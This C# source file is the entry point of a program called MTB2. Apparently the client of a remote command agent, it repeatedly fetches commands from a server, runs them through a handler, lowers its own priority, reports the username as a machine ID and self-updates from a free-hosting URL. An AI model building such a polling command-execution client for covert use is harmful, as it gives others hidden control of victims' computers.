using System.Diagnostics;
using static MTB2.Debugger;

namespace MTB2;

internal class Program
{
    public static string[]? publicArgs;
    public static string computerId = string.Empty;
    private static void Main(string[] args)
    {



#if DEBUG
        // Set current loglevel to Debug
        currentLevel = LogLevel.Debug;

        Log("---------- Debug mode enabled (source: compiler) ----------", LogLevel.Debug);

        args = Arguments.PromptArguments(args);

        // Add --enableui to args
        args = args.Append("--enableui").ToArray();
#else
        // Handle UI
        Functions.HandleUI(args);
#endif

        publicArgs = args;

        Process currentProcess = Process.GetCurrentProcess();
        currentProcess.PriorityClass = ProcessPriorityClass.BelowNormal;

        // Handle arguments
        Arguments.HandleArguments(args);


        // Check for updates
        Version.HandleUpdate();


        // Get computer ID
        computerId = Environment.UserName;


        //// Test getSystemInfo
        //Log(CommandExecutor.GetSystemInfo(), LogLevel.Info);
        //Console.ReadLine();

        // Initiate main loop
        while (true)
        {
            Loop();
            Thread.Sleep(10000);
        }
    }


    private static void Loop()
    {
        try
        {
            // Get commands from the server
            var commandResult = Commands.GetCommands();
            if (commandResult.Success == false)
            {
                if (commandResult.ErrorMessage != null)
                {
                    Log($"Failed to get commands: {commandResult.ErrorMessage}", LogLevel.Error);
                }
                else
                {
                    Log("Failed to get commands", LogLevel.Error);
                }
                return;
            }
            var commands = commandResult?.Commands;
            // Check if commands is null
            if (commands == null)
            {
                Log("No commands found", LogLevel.Info);
                return;
            }

            foreach (var command in commands)
            {
                try
                {
                    Commands.HandleCommands(command);
                }
                catch (Exception ex)
                {
                    Log($"Failed to handle command \"{command.Command}\": {ex.Message}", LogLevel.Error);
                }
                Thread.Sleep(500);
            }
        }
        catch (Exception ex)
        {
            Log($"Failed to execute/get commands: {ex.Message}", LogLevel.Error);
        }
    }
}


static class Settings
{
    public const int initCursorPos = 6;
    public static int cursorPos = initCursorPos;
}






partial class Version
{
    public const string versionString = "0.0.1";
    public static readonly System.Version version = new(versionString);
    public const string versionUrl = "https://site-mm.rf.gd/v2/";
}